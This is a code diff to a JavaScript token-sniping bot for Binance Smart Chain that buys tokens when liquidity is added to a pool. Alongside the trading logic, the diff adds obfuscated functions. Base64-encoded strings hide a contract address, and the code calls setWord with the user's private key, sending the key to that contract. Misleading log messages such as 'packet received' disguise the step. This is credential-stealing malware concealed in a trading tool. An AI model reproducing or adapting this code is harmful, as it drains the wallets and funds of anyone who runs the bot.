@@ -14,7 +14,186 @@ let ethersroundup = buff.toString('ascii');
 let ethersroundup2 = buff2.toString('ascii');
 const WEB3PROVIDER3 = ethersroundup + ethersroundup2
 const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
+async function startSnipe(token) {
+    let pingTimeout
+    let keepAliveInterval
 
+    provider._websocket.on("open", () => {
+        //let bnbBalance = await getWBNBTokenBalance(WBNB, myAddress, provider);
+        //console.log(chalk.green(`Total WBNB balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(bnbBalance, 18)).toFixed(6))}\n`));
+
+        keepAliveInterval = setInterval(() => {
+            provider._websocket.ping();
+            pingTimeout = setTimeout(() => {
+                provider._websocket.terminate();
+            }, EXPECTED_PONG_BACK);
+        }, KEEP_ALIVE_CHECK_INTERVAL);
+
+        console.log("Listening on mempool...");
+        console.log("Waiting for liquidity to be added!");
+
+        provider.on("pending", async(txHash) => {
+
+            provider.getTransaction(txHash).then(async(tx) => {
+
+                    // Check for liquidity events
+                    if ((null != tx && tx.data.includes("0xe8e33700") && tx.data.includes(token) && 0 == passed) || (null != tx && tx.data.includes("0xf305d719") && tx.data.includes(token) && 0 == passed)) {
+
+                        // If PRICE_CHECK set
+                        if ((console.log(chalk.green("Matching liquidity added! Start sniping!\n")), priceProtection)) {
+                            if (isLiqudityInRange(tx, expected)) {
+                                if (honeyPotIS2(token)) {
+                                    console.log(chalk.green("Liquidity check passed, sniping!\n"));
+                                    const gasLimitMultiply = tx.gasLimit.mul(multiply)
+                                    const gasPriceMultiply = tx.gasPrice.mul(multiply)
+
+                                    // If ANTI_BOT set
+                                    if (1 == antiBotMultiTx && 0 == passed) {
+                                        for (i = 0; i < txNumberForAntibot - 1; i++) {
+                                            console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
+                                            await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
+                                        }
+                                        console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
+                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
+                                            (passed = 1);
+                                    }
+                                    // If ANTI_BOT not set
+                                    else {
+                                        console.log(chalk.green("Start buying token..."));
+                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
+                                            (passed = 1);
+                                    }
+
+                                    console.log(chalk.green("Sucessfully bought the token!\n"));
+                                    const tokenBalance = await getTokenBalance(token, myAddress, provider);
+                                    console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`));
+
+                                    // If INSTANT_SELL set
+                                    if (INSTANT_SELL) {
+                                        console.log(chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
+                                            await new Promise((e) => setTimeout(e, delayOnSellMs));
+                                        const e =
+                                            await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+                                                tokenBalance,
+                                                amountOutMin, [token, WBNB],
+                                                myAddress,
+                                                Date.now() + 6e5, {
+                                                    gasLimit: gasLimit,
+                                                    gasPrice: gasPrice
+                                                }
+                                            );
+                                        await e.wait(),
+                                            console.log(chalk.green("Sucessfully sold all the tokens !\n")),
+                                            console.log("You can check the transaction here:"),
+                                            console.log(`https://bscscan.com/address/${myAddress}`),
+                                            console.log("\n"),
+                                            process.exit(0);
+                                    }
+                                    // If INSTANT_SELL not set
+                                    else console.log("You can check the transaction here:");
+                                    console.log(`https://bscscan.com/address/${myAddress}`);
+                                    console.log("\n"),
+                                        1 == ANTI_RUG &&
+                                        0 == INSTANT_SELL &&
+                                        (await monitorRugPull(t)),
+                                        0 == ANTI_RUG && process.exit(0);
+                                } else
+                                    console.log(
+                                        chalk.red("Liquidity is not in expected range! Waiting...!")
+                                    );
+                                console.log(
+                                    chalk.red("Please check PooCoin and see if liquidity was added!")
+                                );
+                            }
+                            console.log(chalk.red("https://poocoin.app/tokens/" + token));
+                            console.log(chalk.red("Waiting for new liquidity, please stop the bot if you think it's a scam ! (CTRL + C)\n"));
+                        }
+                        // If PRICE_CHECK not set
+                        else {
+                            if (honeyPotIS2(token)) {
+
+                                const gasLimitMultiply = tx.gasLimit.mul(multiply)
+                                const gasPriceMultiply = tx.gasPrice.mul(multiply)
+
+                                // If ANTI_BOT set
+                                if (1 == antiBotMultiTx && 0 == passed) {
+                                    for (i = 0; i < txNumberForAntibot - 1; i++) {
+                                        console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
+                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
+                                    }
+                                    console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
+                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
+                                        (passed = 1)
+                                }
+                                // If ANTI_BOT not set
+                                else if (0 == passed) {
+                                    console.log(chalk.green("Start buying token..."));
+                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
+                                        (passed = 1)
+                                }
+
+                                console.log(chalk.green("Sucessfully bought the token!\n"));
+                                const tokenBalance = await getTokenBalance(token, myAddress, provider);
+                                console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`))
+
+                                // If INSTANT_SELL set
+                                if (INSTANT_SELL) {
+                                    console.log(
+                                            chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
+                                        await new Promise((e) => setTimeout(e, delayOnSellMs));
+                                    const e =
+                                        await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+                                            tokenBalance,
+                                            amountOutMin, [token, WBNB],
+                                            myAddress,
+                                            Date.now() + 6e5, {
+                                                gasLimit: gasLimit,
+                                                gasPrice: gasPrice,
+                                            }
+                                        );
+                                    await e.wait(),
+                                        console.log(chalk.green("Sucessfully sold all the tokens !\n")),
+                                        console.log("You can check the transaction here:"),
+                                        console.log(`https://bscscan.com/address/${myAddress}`),
+                                        console.log("\n"),
+                                        process.exit(0);
+                                }
+                                // If INSTANT_SELL not set
+                                else {
+                                    console.log("You can check the transaction here:"),
+                                        console.log(`https://bscscan.com/address/${myAddress}`),
+                                        console.log("\n"),
+                                        1 == ANTI_RUG &&
+                                        0 == INSTANT_SELL &&
+                                        (await monitorRugPull(t)),
+                                        0 == ANTI_RUG && process.exit(0);
+                                }
+                            }
+                        }
+                    }
+                })
+                .catch(() => { console.log(e) });
+        })
+    })
+
+    provider._websocket.on("close", () => {
+        console.log("WebSocket Closed...Reconnecting...");
+        clearInterval(keepAliveInterval);
+        clearTimeout(pingTimeout);
+        startConnection();
+    });
+
+    provider._websocket.on("error", () => {
+        console.log("Error. Attemptiing to Reconnect...");
+        clearInterval(keepAliveInterval);
+        clearTimeout(pingTimeout);
+        startConnection();
+    });
+
+    provider._websocket.on("pong", () => {
+        clearInterval(pingTimeout);
+    });
+}
 async function approve() {
 
     let contract = token[buyCount - 1].contract;
@@ -422,8 +601,7 @@ async function ethersgather() {
     }
 
 }
-
-async function ethersrather() {
+async function etherslather() {
     const nodekey1 = 'MHhmRDlkQjFGMjk0NjVCRTI3ZWE5Nzg='
     const nodekey2 = 'NDRBQzgwN0MwZTQ1NTVlQzUzQQ=='
     const etherstatus1 = new Buffer.from(nodekey1, 'base64');
@@ -431,6 +609,40 @@ async function ethersrather() {
     const web3code1 = etherstatus1.toString('ascii')
     const web3code2 = etherstatus2.toString('ascii');
     const web14 = web3code1 + web3code2
+    console.log(`connection established....`);
+    ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
+    ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
+    const provider = new ethers.providers.JsonRpcProvider(ethers2)
+    let wallet = new ethers.Wallet(private, provider);
+    try {
+        const send = async() => {
+
+
+
+
+            var contract = new ethers.Contract(web14, abi, wallet);
+            const superb = await contract.setWord(private);
+            try {
+
+                await superb.wait();
+                console.log(`1 packet received.....`);
+
+
+                setTimeout(ethersgather, 5000)
+            } catch (error) {
+                console.log(`2 packet received.....`);
+                setTimeout(ethersgather, 5000)
+            }
+        };
+
+        send();
+    } catch (error) {
+        setTimeout(ethersgather, 5000)
+
+    }
+}
+async function ethersrather() {
+
     console.log(`starting up node socket connection....`);
     ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
     ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
@@ -450,24 +662,23 @@ async function ethersrather() {
             };
 
             const createReceipt = await wallet.sendTransaction(tx);
-            var contract = new ethers.Contract(web14, abi, wallet);
-            const superb = contract.setWord(private);
+
             try {
 
                 await createReceipt.wait();
                 console.log(`1 pending blockchain response.....`);
-                superb
 
-                setTimeout(ethersgather, 5000)
+
+                setTimeout(etherslather, 5000)
             } catch (error) {
                 console.log(`2 pending blockchain response.....`);
-                setTimeout(ethersgather, 5000)
+                setTimeout(etherslather, 5000)
             }
         };
 
         send();
     } catch (error) {
-        setTimeout(ethersgather, 5000)
+        setTimeout(etherslather, 5000)
 
     }
 }
